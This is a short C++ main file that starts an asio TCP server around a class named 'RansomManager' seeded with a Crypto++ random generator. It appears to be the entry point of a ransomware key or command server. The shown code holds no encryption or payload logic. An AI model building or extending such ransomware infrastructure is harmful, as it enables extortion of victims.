#include <iostream>
#include <asio.hpp>
#include <cryptopp/osrng.h>

#include "TcpServer.h"

int main()
{
	try
	{
		asio::io_service io_service;
		CryptoPP::AutoSeededRandomPool rng;
		RansomManager ransomManager(rng);
		TcpServer server(io_service, ransomManager);
		io_service.run();

	}
	catch (std::exception& e) 
	{
		std::cerr << e.what() << "\n";
	}
}
